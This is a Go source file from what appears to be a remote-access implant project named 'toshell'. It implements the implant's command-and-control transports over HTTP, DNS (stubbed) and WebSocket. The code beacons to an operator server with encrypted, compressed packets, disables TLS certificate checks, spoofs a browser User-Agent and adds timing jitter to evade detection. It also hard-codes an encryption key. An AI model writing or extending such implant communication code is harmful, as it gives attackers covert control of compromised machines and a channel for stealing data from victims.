package transport

import (
	"bytes"
	"compress/gzip"
	"crypto/tls"
	"encoding/binary"
	"fmt"
	"io"
	"net/http"
	"time"

	"github.com/gorilla/websocket"

	"toshell/internal/implant/crypto"
	"toshell/internal/common/protocol"
)

type Transport interface {
	Send(packet *protocol.Packet) error
	Receive() (*protocol.Packet, error)
	Close() error
	GetInterval() time.Duration
}

type HTTPTransport struct {
	serverURL string
	client    *http.Client
	encryptor *crypto.Encryptor
	interval  time.Duration
	jitter    time.Duration
}

func NewHTTPTransport(serverURL string, interval, jitter uint32) (*HTTPTransport, error) {
	key, err := crypto.GenerateRandomBytes(32)
	if err != nil {
		return nil, err
	}

	enc, err := crypto.NewAESEncryptor(key)
	if err != nil {
		return nil, err
	}

	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}

	client := &http.Client{
		Transport: tr,
		Timeout:   30 * time.Second,
	}

	return &HTTPTransport{
		serverURL: serverURL,
		client:    client,
		encryptor: enc,
		interval:  time.Duration(interval) * time.Second,
		jitter:    time.Duration(jitter) * time.Second,
	}, nil
}

func (t *HTTPTransport) Send(packet *protocol.Packet) error {
	data := encodePacket(packet)

	compressed, err := compress(data)
	if err != nil {
		return err
	}

	encrypted, err := t.encryptor.Encrypt(compressed)
	if err != nil {
		return err
	}

	req, err := http.NewRequest("POST", t.serverURL, bytes.NewBuffer(encrypted))
	if err != nil {
		return err
	}

	req.Header.Set("Content-Type", "application/octet-stream")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")

	resp, err := t.client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("server returned status: %d", resp.StatusCode)
	}

	return nil
}

func (t *HTTPTransport) Receive() (*protocol.Packet, error) {
	req, err := http.NewRequest("GET", t.serverURL, nil)
	if err != nil {
		return nil, err
	}

	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")

	resp, err := t.client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	if len(body) == 0 {
		return nil, nil
	}

	decrypted, err := t.encryptor.Decrypt(body)
	if err != nil {
		return nil, err
	}

	decompressed, err := decompress(decrypted)
	if err != nil {
		return nil, err
	}

	packet, err := parsePacket(decompressed)
	if err != nil {
		return nil, err
	}

	return packet, nil
}

func (t *HTTPTransport) Close() error {
	return nil
}

func (t *HTTPTransport) GetInterval() time.Duration {
	return t.interval + t.jitter
}

func (t *DNSTransport) GetInterval() time.Duration {
	return t.interval + t.jitter
}

func encodePacket(packet *protocol.Packet) []byte {
	data := make([]byte, protocol.HeaderSize)
	copy(data[0:4], packet.Magic[:])
	data[4] = packet.Version
	data[5] = packet.Type
	binary.BigEndian.PutUint32(data[6:10], packet.Length)
	binary.BigEndian.PutUint64(data[10:18], packet.ID)
	binary.BigEndian.PutUint64(data[18:26], packet.Timestamp)
	binary.BigEndian.PutUint32(data[26:30], packet.Checksum)

	if packet.Payload != nil {
		data = append(data, packet.Payload...)
	}

	return data
}

func parsePacket(data []byte) (*protocol.Packet, error) {
	if len(data) < protocol.HeaderSize {
		return nil, fmt.Errorf("packet too short")
	}

	packet := &protocol.Packet{}
	copy(packet.Magic[:], data[0:4])
	packet.Version = data[4]
	packet.Type = data[5]
	packet.Length = binary.BigEndian.Uint32(data[6:10])
	packet.ID = binary.BigEndian.Uint64(data[10:18])
	packet.Timestamp = binary.BigEndian.Uint64(data[18:26])
	packet.Checksum = binary.BigEndian.Uint32(data[26:30])

	if packet.Length > 0 && int(packet.Length) <= len(data)-protocol.HeaderSize {
		payload := make([]byte, packet.Length)
		copy(payload, data[protocol.HeaderSize:protocol.HeaderSize+packet.Length])
		packet.Payload = payload
	}

	return packet, nil
}

func compress(data []byte) ([]byte, error) {
	var buf bytes.Buffer
	gz := gzip.NewWriter(&buf)

	_, err := gz.Write(data)
	if err != nil {
		return nil, err
	}

	if err := gz.Close(); err != nil {
		return nil, err
	}

	return buf.Bytes(), nil
}

func decompress(data []byte) ([]byte, error) {
	reader, err := gzip.NewReader(bytes.NewReader(data))
	if err != nil {
		return nil, err
	}
	defer reader.Close()

	return io.ReadAll(reader)
}

type DNSTransport struct {
	domain     string
	encryptor  *crypto.Encryptor
	interval   time.Duration
	jitter     time.Duration
}

func NewDNSTransport(domain string, interval, jitter uint32) (*DNSTransport, error) {
	key, err := crypto.GenerateRandomBytes(32)
	if err != nil {
		return nil, err
	}

	enc, err := crypto.NewAESEncryptor(key)
	if err != nil {
		return nil, err
	}

	return &DNSTransport{
		domain:   domain,
		encryptor: enc,
		interval: time.Duration(interval) * time.Second,
		jitter:   time.Duration(jitter) * time.Second,
	}, nil
}

func (t *DNSTransport) Send(packet *protocol.Packet) error {
	return nil
}

func (t *DNSTransport) Receive() (*protocol.Packet, error) {
	return nil, nil
}

func (t *DNSTransport) Close() error {
	return nil
}

type WebSocketTransport struct {
	serverURL string
	encryptor *crypto.Encryptor
	conn      *websocket.Conn
	interval  time.Duration
}

func NewWebSocketTransport(serverURL string) (*WebSocketTransport, error) {
	// 使用固定密钥，方便测试 (32字节)
	key := []byte("toshell-secret-key-1234567890123")

	enc, err := crypto.NewAESEncryptor(key)
	if err != nil {
		return nil, err
	}

	// 连接到WebSocket服务器
	dialer := websocket.Dialer{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}

	conn, _, err := dialer.Dial(serverURL, nil)
	if err != nil {
		return nil, err
	}

	return &WebSocketTransport{
		serverURL: serverURL,
		encryptor: enc,
		conn:      conn,
		interval:  30 * time.Second, // 默认30秒心跳间隔
	}, nil
}

func (t *WebSocketTransport) Send(packet *protocol.Packet) error {
	// 编码数据包
	data := encodePacket(packet)

	// 压缩数据
	compressed, err := compress(data)
	if err != nil {
		return err
	}

	// 加密数据
	encrypted, err := t.encryptor.Encrypt(compressed)
	if err != nil {
		return err
	}

	// 发送数据
	t.conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
	return t.conn.WriteMessage(websocket.BinaryMessage, encrypted)
}

func (t *WebSocketTransport) Receive() (*protocol.Packet, error) {
	// 接收数据
	t.conn.SetReadDeadline(time.Now().Add(60 * time.Second))
	_, data, err := t.conn.ReadMessage()
	if err != nil {
		return nil, err
	}

	// 解密数据
	decrypted, err := t.encryptor.Decrypt(data)
	if err != nil {
		return nil, err
	}

	// 解压缩数据
	decompressed, err := decompress(decrypted)
	if err != nil {
		return nil, err
	}

	// 解析数据包
	return parsePacket(decompressed)
}

func (t *WebSocketTransport) Close() error {
	if t.conn != nil {
		return t.conn.Close()
	}
	return nil
}

func (t *WebSocketTransport) GetInterval() time.Duration {
	return t.interval
}
